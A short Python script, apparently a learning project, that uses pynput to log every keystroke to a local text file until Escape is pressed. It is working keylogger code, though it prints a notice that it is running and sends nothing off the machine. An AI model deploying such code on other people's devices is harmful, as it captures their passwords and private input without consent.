from pynput.keyboard import Key, Listener     #import the essential library.

#file for storing keystrokes
log_file = "KeyLogs.txt"
print("KeyLogger is Actively running in the background")
#Defining on_press functionalities
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            if hasattr(key, 'char'):
                f.write(f"{key.char}")
            else:
                f.write(f"[{key}]")
    except Exception as e:
        print(f"\nAn error occured while logging the keystrokes\n{e}")

#Defining on_relaese functionalites
def on_release(key):
    if key == Key.esc:                        #Stop logging when escape is pressed.  
        print("Escape is pressed.\nExiting the program....")
        return False

#Starting the listener with keystrokes
with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()                           #for continuously running in the background.

